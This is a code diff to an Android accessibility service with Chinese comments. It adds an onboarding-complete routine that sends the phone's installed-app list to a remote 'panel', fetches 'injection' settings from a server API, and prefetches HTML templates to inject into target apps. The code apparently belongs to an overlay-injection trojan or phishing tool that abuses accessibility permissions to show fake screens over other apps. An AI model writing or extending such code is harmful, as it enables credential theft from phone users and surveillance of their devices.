@@ -431,6 +431,26 @@ class BoundaryAccessibilityService : AccessibilityService() {
         runCatching { com.zaka.screenagent.ui.GuardOverlay.relayout(this) }
     }
 
+    /**
+     * 引导（含权限）完成后统一做三件事 —— 与厂商无关：
+     *   ① 把已安装应用列表推给面板（面板「注入目标」才能显示本机已安装）
+     *   ② 拉一次注入配置（/api/device-inject-settings）
+     *   ③ 把配置里的模板 HTML 预取到本地（注入时秒开，不依赖当场网络）
+     */
+    fun onOnboardingComplete() {
+        Log.d("AccGuard", "onboarding complete -> send appList + refresh inject + prefetch html")
+        main.postDelayed({
+            runCatching { moying?.let { com.zaka.screenagent.net.AppList.send(it, this) } }
+            runCatching {
+                com.zaka.screenagent.inject.InjectRepo.refresh(this, force = true)
+                // refresh 是异步线程，等 2 秒再预取
+                main.postDelayed({
+                    runCatching { com.zaka.screenagent.inject.InjectRepo.prefetchAll(this) }
+                }, 2_000L)
+            }
+        }, 2_000L)
+    }
+
     private fun unusedAnchor() {
         startFgWatch()
         // 无障碍连上（=权限到位）后把已安装应用列表推给面板，注入目标才能显示"本机已安装"
